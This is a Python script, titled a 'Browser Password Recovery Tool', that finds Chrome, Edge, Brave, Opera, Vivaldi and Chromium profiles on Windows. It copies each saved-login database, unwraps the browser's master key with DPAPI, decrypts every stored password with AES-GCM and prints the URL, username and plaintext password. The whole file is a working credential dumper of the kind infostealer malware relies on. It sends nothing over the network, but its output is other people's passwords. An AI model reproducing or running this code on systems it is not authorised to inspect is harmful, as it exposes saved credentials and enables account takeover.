import json
import os
import shutil
import sqlite3
from base64 import b64decode
from glob import glob

import win32crypt
from Crypto.Cipher import AES

tmp = os.getenv("TEMP") or "."
usa = os.environ["USERPROFILE"]

# Known Chromium-based browser paths
BROWSER_PATHS = {
    "Chrome": {
        "root": os.path.join(usa, r"AppData\Local\Google\Chrome\User Data"),
        "local_state": os.path.join(usa, r"AppData\Local\Google\Chrome\User Data\Local State"),
    },
    "Edge": {
        "root": os.path.join(usa, r"AppData\Local\Microsoft\Edge\User Data"),
        "local_state": os.path.join(usa, r"AppData\Local\Microsoft\Edge\User Data\Local State"),
    },
    "Brave": {
        "root": os.path.join(usa, r"AppData\Local\BraveSoftware\Brave-Browser\User Data"),
        "local_state": os.path.join(usa, r"AppData\Local\BraveSoftware\Brave-Browser\User Data\Local State"),
    },
    "Opera": {
        "root": os.path.join(usa, r"AppData\Roaming\Opera Software\Opera Stable"),
        "local_state": os.path.join(usa, r"AppData\Roaming\Opera Software\Opera Stable\Local State"),
    },
    "Opera GX": {
        "root": os.path.join(usa, r"AppData\Roaming\Opera Software\Opera GX Stable"),
        "local_state": os.path.join(usa, r"AppData\Roaming\Opera Software\Opera GX Stable\Local State"),
    },
    "Vivaldi": {
        "root": os.path.join(usa, r"AppData\Local\Vivaldi\User Data"),
        "local_state": os.path.join(usa, r"AppData\Local\Vivaldi\User Data\Local State"),
    },
    "Chromium": {
        "root": os.path.join(usa, r"AppData\Local\Chromium\User Data"),
        "local_state": os.path.join(usa, r"AppData\Local\Chromium\User Data\Local State"),
    },
}

def print_encrypted_warning():
    """Print ASCII art warning for encrypted passwords"""
    print("\n" + "╔" + "═" * 78 + "╗")
    print("║" + " " * 78 + "║")
    print("║" + "    ⚠️  ENCRYPTED PASSWORDS DETECTED - CANNOT BE DECRYPTED  ⚠️".center(78) + "║")
    print("║" + " " * 78 + "║")
    print("║" + "  These passwords are encrypted with a different encryption scheme or".center(78) + "║")
    print("║" + "  from a different Windows user/machine context.".center(78) + "║")
    print("║" + " " * 78 + "║")
    print("║" + "  ✓ Email addresses are shown below".center(78) + "║")
    print("║" + "  ✗ Passwords cannot be extracted by this script".center(78) + "║")
    print("║" + " " * 78 + "║")
    print("║" + "  Sorry, encrypted passwords are not accessible! 😔".center(78) + "║")
    print("║" + " " * 78 + "║")
    print("╚" + "═" * 78 + "╝\n")

def find_profiles(browser_root: str):
    """Find all profiles (Default, Profile 1, Profile 2, etc.) in a browser"""
    profiles = []
    if not os.path.isdir(browser_root):
        return profiles
    
    # Check Default profile
    default_login = os.path.join(browser_root, "Default", "Login Data")
    if os.path.exists(default_login):
        profiles.append(("Default", default_login))
    
    # Check numbered profiles
    for profile_dir in glob(os.path.join(browser_root, "Profile *")):
        login_db = os.path.join(profile_dir, "Login Data")
        if os.path.exists(login_db):
            profiles.append((os.path.basename(profile_dir), login_db))
    
    return profiles

def load_aes_key(local_state_path: str) -> bytes:
    """Load and decrypt the AES key from Local State file"""
    if not os.path.exists(local_state_path):
        raise FileNotFoundError(f"Local State not found: {local_state_path}")
    
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.load(f)
    
    enc_key_b64 = local_state["os_crypt"]["encrypted_key"]
    enc_key = b64decode(enc_key_b64)
    if enc_key.startswith(b"DPAPI"):
        enc_key = enc_key[5:]
    return win32crypt.CryptUnprotectData(enc_key, None, None, None, 0)[1]

def dec_password(pwd_blob: bytes, aes_key: bytes) -> str:
    """Decrypt password blob using AES-GCM or DPAPI"""
    try:
        if pwd_blob is None or len(pwd_blob) == 0:
            return "[NO_PASSWORD]"
        if isinstance(pwd_blob, memoryview):
            pwd_blob = pwd_blob.tobytes()

        # New scheme: v10/v11/v20 + 12-byte nonce + ciphertext + 16-byte tag
        if pwd_blob.startswith(b"v10") or pwd_blob.startswith(b"v11") or pwd_blob.startswith(b"v20"):
            if len(pwd_blob) < 3 + 12 + 16:
                return "[ENCRYPTED - CANNOT DECRYPT]"
            nonce = pwd_blob[3:15]
            ciphertext = pwd_blob[15:-16]
            tag = pwd_blob[-16:]
            cipher = AES.new(aes_key, AES.MODE_GCM, nonce=nonce)
            try:
                pt = cipher.decrypt_and_verify(ciphertext, tag)
                return pt.decode("utf-8", errors="replace")
            except Exception:
                return "[ENCRYPTED - CANNOT DECRYPT]"

        # Legacy scheme: blob directly DPAPI-protected
        try:
            pt = win32crypt.CryptUnprotectData(pwd_blob, None, None, None, 0)[1]
            return pt.decode("utf-8", errors="replace")
        except Exception:
            return "[ENCRYPTED - CANNOT DECRYPT]"

    except Exception:
        return "[ENCRYPTED - CANNOT DECRYPT]"

def should_skip(url: str, user: str, password: str, show_encrypted: bool) -> bool:
    """Determine if entry should be skipped"""
    # Skip android:// URLs
    if url.startswith("android://"):
        return True
    
    # Skip if no username
    if not user or user == "[NO_USERNAME]":
        return True
    
    # Skip if no password at all
    if not password or password == "[NO_PASSWORD]":
        return True
    
    # If show_encrypted is False, skip encrypted entries
    if not show_encrypted and password == "[ENCRYPTED - CANNOT DECRYPT]":
        return True
    
    return False

def process_browser(browser_name: str, browser_root: str, local_state_path: str, show_encrypted: bool = True):
    """Process all profiles for a given browser"""
    profiles = find_profiles(browser_root)
    if not profiles:
        return 0, 0
    
    try:
        master_key = load_aes_key(local_state_path)
    except Exception as e:
        print(f"{browser_name}: Failed to load encryption key - {e}")
        return 0, 0
    
    total_found = 0
    encrypted_count = 0
    encrypted_entries = []
    
    for profile_name, login_db in profiles:
        # Copy DB to temp so we can read it while browser is open
        db_copy = os.path.join(tmp, f"{browser_name}_{profile_name}_Login.db")
        shutil.copy2(login_db, db_copy)
        
        conn = sqlite3.connect(db_copy)
        try:
            cur = conn.cursor()
            cur.execute("""
                SELECT
                    COALESCE(origin_url, action_url, signon_realm, '') AS url,
                    username_value,
                    password_value
                FROM logins
            """)
            rows = cur.fetchall()
        finally:
            conn.close()
        
        # Process each row
        for url, username, pwd_blob in rows:
            site = url or "[NO_URL]"
            user = username or "[NO_USERNAME]"
            decrypted = dec_password(pwd_blob, master_key)
            
            if should_skip(site, user, decrypted, show_encrypted):
                continue
            
            total_found += 1
            profile_tag = f"[{profile_name}]" if profile_name != "Default" else ""
            
            if decrypted == "[ENCRYPTED - CANNOT DECRYPT]":
                encrypted_count += 1
                encrypted_entries.append((browser_name, profile_tag, site, user))
            else:
                print(f"[{browser_name}]{profile_tag} URL: {site}, User: {user}, Pass: {decrypted}")
    
    # If there are encrypted entries, show warning and list them
    if encrypted_count > 0:
        print_encrypted_warning()
        for browser, profile, site, user in encrypted_entries:
            print(f"[{browser}]{profile} URL: {site}, User: {user}, Pass: [❌ ENCRYPTED]")
    
    return total_found, encrypted_count

def main():
    print("=" * 80)
    print("Browser Password Recovery Tool".center(80))
    print("=" * 80)
    print("\nScanning for installed browsers...\n")
    
    found_browsers = []
    total_passwords = 0
    total_encrypted = 0
    
    # Scan for all browsers
    for browser_name, paths in BROWSER_PATHS.items():
        browser_root = paths["root"]
        local_state = paths["local_state"]
        
        if os.path.isdir(browser_root) and os.path.exists(local_state):
            found_browsers.append(browser_name)
            print(f"[+] Found: {browser_name}")
    
    if not found_browsers:
        print("[-] No supported browsers found.")
        return
    
    print(f"\n{'-' * 80}")
    print("Extracting passwords...".center(80))
    print(f"{'-' * 80}\n")
    
    # Process each found browser
    for browser_name in found_browsers:
        paths = BROWSER_PATHS[browser_name]
        count, encrypted = process_browser(
            browser_name,
            paths["root"],
            paths["local_state"],
            show_encrypted=True
        )
        total_passwords += count
        total_encrypted += encrypted
        
        if count > 0:
            decrypted_count = count - encrypted
            print(f"\n{browser_name}: {count} entries found ({decrypted_count} decrypted, {encrypted} encrypted)")
        print()
    
    print(f"{'-' * 80}")
    print(f"Total: {total_passwords} credential(s) extracted".center(80))
    print(f"       ({total_passwords - total_encrypted} decrypted, {total_encrypted} encrypted)".center(80))
    print(f"{'-' * 80}")

if __name__ == "__main__":
    main()
